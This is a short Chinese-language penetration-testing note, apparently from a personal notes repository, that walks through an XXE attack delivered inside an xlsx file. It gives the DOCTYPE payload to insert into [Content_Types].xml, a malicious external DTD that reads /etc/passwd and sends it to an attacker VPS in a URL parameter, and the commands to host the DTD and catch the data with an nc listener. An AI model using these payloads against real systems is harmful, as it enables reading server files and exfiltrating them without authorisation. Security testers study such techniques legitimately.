## 制作插入Payload的xlsx文件

创建`xlsl`文件，后缀改为 .zip 然后解压缩。

> ⚠️ xls是一个特有的二进制格式,xls没办法插入Payload进行XXE攻击.

在[Content_Types].xml文件中插入Payload

```xml
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://<yourvpsip:http-port>/malicious.dtd"> %xxe;]>
```

![](https://github.com/user-error-404/PenetrateNotes/blob/main/img/EXCEL-XXE.jpg)

将插入Payload后的文件重新压缩，再将压缩包的后缀名修改为 `xlsx`

## 在vps使用http托管恶意dtd文件

在恶意malicious.dtd文件所在目录启动http服务：
```python
python3 -m http.server 端口号
python2 -m SimpleHTTPServer 端口号
```

恶意文件 [malicious.dtd](https://github.com/user-error-404/PenetrateNotes/blob/main/file/malicious.dtd)：

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://<yourvpsip:nc-port>/?x=%file;'>">
%eval;
%exfiltrate;
```

## 在vps开启nc监听

```bash
nc -lvvp 8081
```




